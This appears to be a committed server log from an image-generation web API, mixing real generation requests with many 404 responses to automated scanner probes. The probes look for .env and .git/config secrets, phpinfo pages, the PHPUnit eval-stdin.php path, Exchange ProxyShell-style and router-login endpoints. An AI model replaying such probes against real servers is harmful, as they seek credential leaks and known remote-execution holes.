+INFO:     45.81.243.34:0 - "POST /HNAP1/ HTTP/1.0" 404 Not Found
+INFO:     187.110.208.123:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35128 - "GET /index.html HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35130 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35132 - "GET /owa/auth/logon.aspx HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35134 - "GET /index.html HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35136 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35138 - "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35140 - "GET /owa/auth/x.js HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET /config/getuser?index=0 HTTP/1.0" 404 Not Found
+INFO:     152.89.196.54:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     92.223.85.233:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     162.142.125.14:46946 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.14:55916 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.14:60074 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     127.0.0.1:35190 - "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.0" 404 Not Found
+INFO:     167.99.38.71:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "GET /wp-login.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /wp/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /wordpress/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /old/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /new/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /blog/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /backup/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /web/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /site/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     5.188.210.227:0 - "GET /echo.php HTTP/1.0" 404 Not Found
+INFO:     135.148.195.15:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     135.148.195.12:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     152.89.196.54:0 - "GET /actuator/gateway/routes HTTP/1.0" 404 Not Found
+INFO:     117.187.173.39:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35226 - "GET / HTTP/1.0" 404 Not Found
+INFO:     117.187.173.39:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35230 - "GET / HTTP/1.0" 404 Not Found
+INFO:     87.13.224.134:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.42.32.175:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.225.74.42:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     216.251.130.74:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     205.210.31.56:60506 - "GET / HTTP/1.1" 404 Not Found
+INFO:     23.111.114.116:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     45.33.15.94:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     205.210.31.170:65194 - "GET / HTTP/1.1" 404 Not Found
+INFO:     64.226.110.157:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35252 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35254 - "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35256 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35260 - "GET /geoserver/web/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35262 - "GET /.git/config HTTP/1.0" 404 Not Found
+original image shape: (854, 640, 3)
+Do not need resize!
+Image2Image Processing is Done, but it exists erros!
+INFO:     127.0.0.1:35264 - "POST /image2image HTTP/1.0" 200 OK
+original image shape: (854, 640, 3)
+Do not need resize!
+Image2Image Processing is Done, but it exists erros!
+INFO:     127.0.0.1:35266 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     135.148.195.16:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     135.148.195.6:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     64.62.197.169:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     223.111.175.104:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35276 - "GET / HTTP/1.0" 404 Not Found
+INFO:     64.62.197.179:0 - "GET /geoserver/web/ HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35284 - "GET /remote/fgt_lang HTTP/1.0" 404 Not Found
+INFO:     184.105.247.244:54461 - "GET / HTTP/1.1" 404 Not Found
+INFO:     184.105.247.254:42641 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     106.75.67.178:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.67.178:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.67.178:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     106.75.67.178:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     184.105.247.254:7441 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35294 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35296 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35298 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35300 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     47.92.116.248:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35304 - "GET / HTTP/1.0" 404 Not Found
+INFO:     47.92.116.248:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35308 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     87.236.176.192:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     47.92.107.171:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35314 - "GET / HTTP/1.0" 404 Not Found
+INFO:     47.92.107.171:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     47.92.107.171:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35320 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35322 - "GET /admin-app/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35324 - "POST /admin-app/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35326 - "GET /rest/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35328 - "POST /rest/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35330 - "GET /cp/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35332 - "POST /cp/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35334 - "GET /script/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35336 - "POST /script/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35338 - "GET /apps/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35340 - "POST /apps/.env HTTP/1.0" 404 Not Found
+INFO:     94.102.61.48:55888 - "GET / HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35342 - "GET /api/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35344 - "POST /api/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35346 - "GET /docker/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35348 - "POST /docker/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35350 - "GET /.env.project HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35352 - "POST /.env.project HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35354 - "GET /fedex/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35356 - "POST /fedex/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35358 - "GET /enviroments/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35360 - "POST /enviroments/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35362 - "GET /cms/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35364 - "POST /cms/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35366 - "GET /core/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35368 - "POST /core/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35370 - "GET /.env.old HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35372 - "POST /.env.old HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35374 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35376 - "POST /.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35378 - "GET /laravel/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35380 - "POST /laravel/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35382 - "GET /back/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35384 - "POST /back/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35386 - "GET /.env.production HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35388 - "POST /.env.production HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35390 - "GET /enviroments/.env.production HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35392 - "POST /enviroments/.env.production HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35394 - "GET /private/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35396 - "POST /private/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35398 - "GET /live_env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35400 - "POST /live_env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35402 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35404 - "GET /application/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35406 - "POST /application/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35408 - "GET /.env.dist HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35410 - "POST /.env.dist HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35412 - "GET /system/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35414 - "POST /system/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35416 - "GET /.env.prod HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35418 - "POST /.env.prod HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35420 - "GET /local/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35422 - "POST /local/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35424 - "GET /app/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35426 - "POST /app/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35428 - "GET /development/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35430 - "POST /development/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35432 - "GET /sources/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35434 - "POST /sources/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35436 - "GET /.env.save HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35438 - "POST /.env.save HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35440 - "GET /.env.development HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35442 - "POST /.env.development HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35444 - "GET /shared/.env HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35446 - "POST /shared/.env HTTP/1.0" 404 Not Found
+INFO:     85.217.145.45:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35450 - "GET /frontend_dev.php/%24 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35452 - "GET /debug/default/view?panel=config HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35454 - "GET /.json HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35456 - "GET /config.json HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35458 - "GET /phpinfo.php HTTP/1.0" 404 Not Found
+INFO:     35.240.44.240:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35462 - "GET /info.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35464 - "GET /_profiler/phpinfo HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35466 - "GET /?phpinfo=1 HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35468 - "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35470 - "GET /products.json HTTP/1.0" 404 Not Found
+INFO:     148.153.45.238:52390 - "GET /xR9Y HTTP/1.1" 404 Not Found
+INFO:     148.153.45.238:52396 - "GET /Gns5 HTTP/1.1" 404 Not Found
+INFO:     148.153.45.238:52410 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     148.153.45.238:52424 - "GET /jquery-3.3.1.slim.min.js HTTP/1.1" 404 Not Found
+INFO:     148.153.45.238:52428 - "GET /aab9 HTTP/1.1" 404 Not Found
+INFO:     148.153.45.238:52442 - "GET /jquery-3.3.2.slim.min.js HTTP/1.1" 404 Not Found
+INFO:     127.0.0.1:35472 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     35.216.216.40:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     87.236.176.58:50145 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.221.192.26:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     18.237.151.153:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35482 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35484 - "GET /products.json HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     192.241.213.74:0 - "GET /ReportServer HTTP/1.0" 404 Not Found
+INFO:     185.209.160.120:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35492 - "GET /actuator/gateway/routes HTTP/1.0" 404 Not Found
+INFO:     106.75.126.212:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.126.212:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.126.212:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     106.75.126.212:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35502 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35504 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35506 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35508 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     20.111.10.112:0 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     20.111.10.112:0 - "GET /.env HTTP/1.0" 404 Not Found
+INFO:     20.111.10.112:0 - "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35516 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35518 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     176.53.217.123:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     176.53.216.89:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     159.89.206.249:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /xmlrpc.php?rsd HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /web/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /website/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /news/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /test/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /media/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /site/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     159.89.206.249:0 - "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35568 - "GET / HTTP/1.0" 404 Not Found
+INFO:     114.134.11.31:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     185.225.74.42:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     162.243.151.4:0 - "GET / HTTP/1.0" 404 Not Found
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.46it/s]  8%|▊         | 2/25 [00:00<00:10,  2.17it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.53it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.76it/s] 20%|██        | 5/25 [00:01<00:06,  2.92it/s] 24%|██▍       | 6/25 [00:02<00:06,  3.01it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.06it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.11it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.14it/s] 40%|████      | 10/25 [00:03<00:04,  3.16it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.17it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.18it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.19it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.19it/s] 60%|██████    | 15/25 [00:05<00:03,  3.20it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.20it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.20it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.21it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.21it/s] 80%|████████  | 20/25 [00:06<00:01,  3.20it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.21it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.21it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.21it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.21it/s]100%|██████████| 25/25 [00:08<00:00,  3.20it/s]100%|██████████| 25/25 [00:08<00:00,  3.06it/s]
+File: ../gen_images/t2i_test_byPostman_小桥, 流水, 人家.png is saved, done!
+Text2Image Processing is Done!
+INFO:     220.194.45.154:0 - "POST /text2image HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.48it/s]  8%|▊         | 2/25 [00:00<00:10,  2.17it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.54it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.77it/s] 20%|██        | 5/25 [00:01<00:06,  2.93it/s] 24%|██▍       | 6/25 [00:02<00:06,  3.01it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.07it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.12it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.15it/s] 40%|████      | 10/25 [00:03<00:04,  3.16it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.18it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.18it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.18it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.19it/s] 60%|██████    | 15/25 [00:05<00:03,  3.20it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.21it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.21it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.21it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.21it/s] 80%|████████  | 20/25 [00:06<00:01,  3.21it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.21it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.21it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.20it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.20it/s]100%|██████████| 25/25 [00:08<00:00,  3.20it/s]100%|██████████| 25/25 [00:08<00:00,  3.06it/s]
+File: ../gen_images/t2i_test_byPostman_小桥, 流水, 人家, 中国画.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:35582 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:35584 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35588 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35590 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.79.138:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     106.75.79.138:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     106.75.79.138:0 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     106.75.79.138:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35600 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35602 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35604 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35606 - "GET /robots.txt HTTP/1.0" 404 Not Found
+2023-03-28 17:54:58.301298: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-28 17:54:58.302733: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (640, 854, 3)
+Do not need resize!
+File: ../gen_images/vej1lesonq7l_日漫.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:35608 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:35610 - "GET /download?file_path=/root/magic_image/gen_images/vej1lesonq7l_%E6%97%A5%E6%BC%AB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:35612 - "POST /feedback HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.44it/s]  8%|▊         | 2/25 [00:01<00:10,  2.14it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.51it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.75it/s] 20%|██        | 5/25 [00:01<00:06,  2.91it/s] 24%|██▍       | 6/25 [00:02<00:06,  3.00it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.05it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.11it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.14it/s] 40%|████      | 10/25 [00:03<00:04,  3.15it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.17it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.19it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.19it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.19it/s] 60%|██████    | 15/25 [00:05<00:03,  3.19it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.20it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.20it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.21it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.21it/s] 80%|████████  | 20/25 [00:06<00:01,  3.21it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.21it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.22it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.22it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.21it/s]100%|██████████| 25/25 [00:08<00:00,  3.21it/s]100%|██████████| 25/25 [00:08<00:00,  3.06it/s]
+File: ../gen_images/o8614j7t3x90_月亮 中秋,,中国画.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:35614 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:35616 - "GET /download?file_path=/root/magic_image/gen_images/o8614j7t3x90_%E6%9C%88%E4%BA%AE%20%E4%B8%AD%E7%A7%8B,,%E4%B8%AD%E5%9B%BD%E7%94%BB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:35618 - "POST /feedback HTTP/1.0" 200 OK
+INFO:     62.133.46.138:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     62.133.46.138:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:35624 - "GET / HTTP/1.0" 404 Not Found
